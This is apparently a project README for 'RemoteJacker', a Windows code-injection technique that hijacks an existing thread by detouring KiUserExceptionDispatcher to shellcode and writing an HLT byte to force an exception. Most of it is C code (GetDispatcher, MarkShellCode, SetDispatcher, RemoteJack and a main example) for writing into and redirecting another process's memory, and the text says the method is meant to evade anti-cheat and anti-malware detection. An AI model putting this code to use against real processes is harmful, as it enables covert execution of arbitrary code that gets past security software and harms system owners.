# RemoteJacker

## Overview

This is about code injection via hijacking threads instead of creating a remote thread. There are methods of code injection where you can create a thread from another process using **CreateRemoteThread** at an executable code location (Or DLL Injection via **CreateRemoteThread** and executing **LoadLibrary**, passing an argument in the **CreateRemoteThread** routine).

There are other ways of code injection to, one of them is hijacking an already running thread. Most methods to do this use **GetThreadContext** and **SetThreadContext**. That method suspends the thread(s) or the process, gets the context of a running thread in a process, writes the extended instruction pointer in the context structure to that of another executable location, then it sets the thread context and resumes the thread(s) or process.

Of course, **CreateRemoteThread** is preferred to not interrupt an application while it's doing something possibly important. Thread hijacking is commonly used to bypass anticheats and antimalware. Antimalware checks for routines that could be used for code injection and are suspicious (**CreateRemoteThread**), while anticheats (espec. kernel-mode anticheats) would attempt to block opening a handle to a thread that they have ownership of from another process. They would also prevent the use of **SetThreadContext** for their threads. The more known a method is, the more anticheats implement ways to obstruct those methods.

**RemoteJacker** detours the SEH dispatcher to an executable code location the developer wants. It causes the thread to redirect to this area by throwing an exception.

```C
ULong GetDispatcher(ULong ProcessId)
{
	NTPtr Dispatcher = (NTPtr)GetProcAddress(GetModuleHandleA("ntdll.dll"), "KiUserExceptionDispatcher");
	HANDLE Process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, ProcessId);

	if (!Process)
		return NULL;
	else
		CloseHandle(Process);
	
	ULong Difference = ((ULong)Dispatcher - (ULong)GetModuleHandleA("ntdll.dll"));
	return (GetModuleBase(ProcessId, L"ntdll.dll") + Difference + 1);
}
```

The **GetDispatcher** function gets the virtual address of **KiUserExceptionDispatcher** and returns it as an integral type.

```C
ULong MarkShellCode(ULong ProcessId, ULong Shellcode)
{
	HANDLE Process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, ProcessId);
	ULong FormerProtection;

	VirtualProtectEx(Process, (LPVOID)Shellcode, 1, PAGE_EXECUTE_READWRITE, &FormerProtection);

	CloseHandle(Process);
	return FormerProtection;
}
```

The **MarkShellCode** function sets the memory region protections at the executable location (Or Shellcode) and returns the former page protection.

```C
void SetDispatcher(ULong ProcessId, ULong Address, ULong ShellCode)
{
	HANDLE Process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, ProcessId);
	ULong FormerProtection;

	VirtualProtectEx(Process, (LPVOID)Address, 1, PAGE_EXECUTE_READWRITE, &FormerProtection);
	WriteHook(Process, GetDispatcher(ProcessId), ShellCode);
	VirtualProtectEx(Process, (LPVOID)Address, 1, FormerProtection, &FormerProtection);

	CloseHandle(Process);
}
```

The **SetDispatcher** function detours KiUserExceptionDispatcher in the target process.

```C
void RemoteJack(ULong ProcessId, ULong Target)
{
	HANDLE Process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, ProcessId);
	ULong FormerProtection;

	VirtualProtectEx(Process, (LPVOID)Target, 1, PAGE_EXECUTE_READWRITE, &FormerProtection);
	WriteProcessMemory(Process, (LPVOID)Target, "\xF4", 1, 0);
	VirtualProtectEx(Process, (LPVOID)Target, 1, FormerProtection, &FormerProtection);

	CloseHandle(Process);
}
```

The **RemoteJack** function causes an exception to occur at a thread's instruction pointer and it gets handled by SEH so we can redirect it in the dispatcher.

Here is an example: 

```C
int main(void)
{
	ULong PId = FindProcessIdFromProcessName(L"test.exe");
	ULong Dispatcher = GetDispatcher(PId);
	ULong ShellCode = 0x04E90000;
	ULong TargetVal = 0x00C92D50;
	ULong Protection = MarkShellCode(PId, ShellCode);

	SetDispatcher(PId, Dispatcher, ShellCode);
	RemoteJack(PId, TargetVal);

    return 0;
}

```

This hijacks an already existing thread without opening any thread handles and you can choose the location that the thread gets hijacked at, unlike **GetThreadContext & SetThreadContext**. This method is also very simple to implement.
